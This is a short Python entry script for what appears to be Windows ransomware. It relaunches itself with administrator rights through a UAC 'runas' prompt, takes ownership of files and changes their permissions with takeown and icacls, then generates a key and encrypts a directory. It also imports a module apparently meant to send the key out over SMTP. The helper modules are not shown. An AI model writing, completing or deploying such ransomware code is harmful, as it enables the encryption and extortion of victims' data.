#!/usr/bin/python
#coding:utf-8

import ctypes, sys, os
from modules.encryption import encrypt
from modules.network import sendkey_smtp
from modules.permissions import takeown, icacls, get_admin_rights

get_own = takeown.GetOwn()
get_rwx = icacls.GetPermission()

if get_admin_rights.is_admin():
    get_own.proc()
    get_own.dir()
    get_rwx.proc()
    get_rwx.dir()
    encrypt.generatekey()
    encrypt.repertoire()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
